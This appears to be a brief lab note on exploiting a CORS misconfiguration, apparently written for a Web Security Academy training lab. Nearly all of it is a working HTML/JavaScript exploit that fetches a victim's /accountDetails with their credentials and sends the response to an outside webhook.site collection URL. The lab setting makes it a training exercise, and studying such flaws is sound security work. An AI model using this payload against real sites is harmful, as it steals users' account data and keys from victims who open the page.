- Basic Cors Misconfiguration :
`Origin reflected in Access-Control-Allow-Origin && Access-Control-Allow-Credentials True`

```sh
<html>
  <body>
    <script>
        var req = new XMLHttpRequest();
        var url = ("https://0a08009804f217fe803f21a500fa0046.web-security-academy.net");
        req.onload = retrieveKeys;
        req.open('GET', url + "/accountDetails",true);
        req.withCredentials = true;
        req.send(null);

    function retrieveKeys() {
            location='https://webhook.site/383f0fd1-02c0-4dfa-a570-a146e498e388/log?key='+this.responseText;
        };

  </script>
  <body>
</html>
```